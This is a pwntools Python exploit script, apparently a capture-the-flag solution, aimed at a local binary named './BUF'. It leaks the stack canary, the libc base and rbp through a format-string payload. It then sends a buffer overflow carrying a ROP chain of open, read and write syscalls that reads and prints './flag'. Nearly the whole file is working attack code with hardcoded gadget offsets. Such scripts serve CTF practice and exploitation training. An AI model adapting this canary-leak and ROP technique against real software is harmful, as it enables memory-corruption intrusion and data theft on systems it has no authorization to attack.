#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./BUF')
elf = ELF('./BUF')
libc = ELF('./libc.so.6')

def pr(a,addr):
	log.success(a+': '+hex(addr))

p.recvuntil("Enter your data:\n")
payload = "%p."*25 + "A"*29 # buf 所占栈空间长度为 104
p.sendline(payload) # sendline() 会在 payload 后面追加一个换行符 '\n' 对应的十六进制就是 0xa

data = p.recv(426)
print(data)

canary = u64(p.recv(8).ljust(8, "\x00")) - 0xa
libcbase = int(data[21:35],16) - 0x114992
rbp = int(data[0:14],16) + 0x70
pr('canary',canary)
pr('libcbase ',libcbase)
pr('rbp',rbp)

#==============================================================

bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0x91396 # syscall; ret;
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret

#=============================orw==============================

p.recvuntil("Enter your data:\n")
payload  = "\x00"*104 + p64(canary)

# open
payload += b'./flag\x00\x00' # rbp
payload += p64(prdi_ret) + p64(rbp) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

#==============================================================

p.send(payload)
p.interactive()